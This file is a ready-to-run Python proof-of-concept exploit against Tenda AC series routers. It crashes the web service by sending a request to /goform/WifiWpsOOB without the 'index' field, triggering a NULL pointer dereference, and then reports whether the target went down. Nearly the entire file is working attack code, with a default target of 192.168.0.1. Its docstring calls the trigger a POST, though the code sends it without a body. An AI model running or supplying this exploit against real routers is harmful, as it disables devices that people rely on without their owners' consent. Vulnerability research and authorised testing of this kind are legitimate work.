#!/usr/bin/env python3
"""
Tenda AC series - formWifiWpsOOB NULL pointer dereference (CWE-476)

Reproduction with an explicit verdict. Performs a two-case comparison:

    baseline : POST with 'index' present   -> expected HTTP 200
    trigger  : POST without 'index'        -> expected no response and a dead service

    usage: python3 poc.py [target-ip] [--port N]

For defensive / authorised testing only.
"""
import argparse
import socket
import sys

TIMEOUT = 20


def request(host, port, path, cookie=None, body=None):
    """Return the status line, or a marker string describing the failure."""
    headers = ['Host: %s' % host, 'Accept: */*']
    if cookie:
        headers.append('Cookie: ' + cookie)
    if body is None:
        head = 'GET %s HTTP/1.1' % path
    else:
        head = 'POST %s HTTP/1.1' % path
        headers.append('Content-Type: application/x-www-form-urlencoded')
        headers.append('Content-Length: %d' % len(body))
    raw = ('\r\n'.join([head] + headers) + '\r\n\r\n').encode()
    if body is not None:
        raw += body if isinstance(body, bytes) else body.encode()

    try:
        s = socket.create_connection((host, port), timeout=TIMEOUT)
        s.settimeout(TIMEOUT)
        s.sendall(raw)
        buf = b''
        while b'\r\n\r\n' not in buf:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
        s.close()
    except Exception as exc:                       # noqa: BLE001
        return 'ERR:%s' % type(exc).__name__, None

    if not buf:
        return 'EMPTY', None                       # connection closed, no reply
    line = buf.split(b'\r\n', 1)[0].decode('latin1', 'replace').strip()
    cookie = None
    for ln in buf.decode('latin1', 'replace').split('\r\n'):
        if ln.lower().startswith('set-cookie:'):
            cookie = ln.split(':', 1)[1].strip().split(';')[0]
    return line, cookie


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('target', nargs='?', default='192.168.0.1')
    ap.add_argument('--port', type=int, default=80)
    ap.add_argument('--path', default='/goform/WifiWpsOOB')
    args = ap.parse_args()

    print('[*] target: http://%s:%d%s' % (args.target, args.port, args.path))

    first, cookie = request(args.target, args.port, args.path)
    print('[1] first contact : %s' % first)
    if not cookie:
        cookie = 'password=x'
    print('    cookie        : %s' % cookie)

    base, _ = request(args.target, args.port, args.path, cookie=cookie,
                      body='index=bbbbbbbbbbbbbbbb&sta_pin=t&wifi_chkHz=t')
    print('[2] baseline      : %s   (index present)' % base)

    trigger, _ = request(args.target, args.port, args.path, cookie=cookie)
    print('[3] trigger       : %s   (index absent)' % trigger)

    after, _ = request(args.target, args.port, args.path, cookie=cookie)
    print('[4] after trigger : %s' % after)
    print()

    if base.startswith('HTTP/1.1 200') and trigger == 'EMPTY' and after != 'EMPTY':
        print('[+] VULNERABLE: the web service stopped responding after the trigger request.')
        return 0
    if trigger == 'EMPTY' and after.startswith('ERR:ConnectionRefused'):
        print('[+] VULNERABLE: the web service terminated (connection refused afterwards).')
        return 0
    print('[-] not reproduced with these parameters.')
    return 1


if __name__ == '__main__':
    sys.exit(main())
